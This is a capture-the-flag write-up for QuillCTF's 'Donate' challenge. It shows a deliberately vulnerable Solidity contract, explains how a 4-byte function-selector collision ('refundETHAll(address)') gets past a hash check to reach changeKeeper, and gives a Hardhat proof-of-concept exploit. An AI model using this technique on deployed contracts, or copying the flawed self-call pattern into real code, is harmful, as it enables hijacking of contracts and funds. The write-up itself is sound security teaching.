# QuillCTF: 12. Donate

> Hey, why not become the Keeper of the Donation?

**Objective of CTF:**

- Initially, you are a hacker. Not the owner or the keeper of Donate contract. The purpose is to call `keeperCheck()` function and get true.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract Donate {
  event t1(bytes _sig);
  address payable public keeper;
  address public owner;
  event newDonate(address indexed, uint amount);

  modifier onlyOwner() {
    require(msg.sender == owner || msg.sender == address(this), "You are not Owner");
    _;
  }

  constructor(address _keeper) {
    keeper = payable(_keeper);
    owner = msg.sender;
  }

  function pay() external payable {
    keeper.transfer(msg.value);
    emit newDonate(msg.sender, msg.value);
  }

  function changeKeeper(address _newKeeper) external onlyOwner {
    keeper = payable(_newKeeper);
  }

  function secretFunction(string memory f) external {
    require(keccak256(bytes(f)) != 0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428, "invalid");
    (bool success, ) = address(this).call(abi.encodeWithSignature(f, msg.sender));
    require(success, "call fail");
  }

  function keeperCheck() external view returns (bool) {
    return (msg.sender == keeper);
  }
}
```

## The Solution

Let's go from the target backwards:

- We want to become the keeper, which seems possible via `changeKeeper`.
- To call that, the caller must be the `owner`, or the contract itself!
- The latter case is great, because then it means we can call that from within the contract. There is a way to do that, using the `secretFunction` function.
- We just have to give the correct `f`, which is `changeKeeper(address)` to be able to call that function.

At this point, the puzzle reveals itself: that require statement within `secretFunction` is checking for the exact hash of `changeKeeper(address)`. So, we can't call that as `f`! What should we do? Well, the function selector only cares about first four bytes, and if we can find some function `foobar(address)` that has the same 4 bytes prefix in its hash, we can still call that function.

An immediate way to do this would be to brute-force our way in finding the correct function name, but there is a better option: google it. Indeed, there is a directory of 4-byte hashes called <www.4byte.directory>, and we can search for out target signature there as: <https://www.4byte.directory/signatures/?bytes4_signature=0x09779838>.

We get two results:

- `changeKeeper(address)`, the one we have seen already
- `refundETHAll(address)`, the one we are looking for!

## Proof of Concept

Here is attack demonstration in Hardhat:

```ts
describe('QuillCTF: 12. Donate', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let keeper: SignerWithAddress;

  let contract: Donate;

  before(async () => {
    [owner, attacker, keeper] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Donate', owner).then(f => f.deploy(keeper.address));
    await contract.deployed();
  });

  it('should hack and become the keeper', async () => {
    await contract.connect(attacker).secretFunction('refundETHAll(address)');
  });

  after(async () => {
    // should call keeperCheck
    await contract.keeperCheck();
    expect(await contract.keeper()).to.eq(attacker.address);
  });
});
```
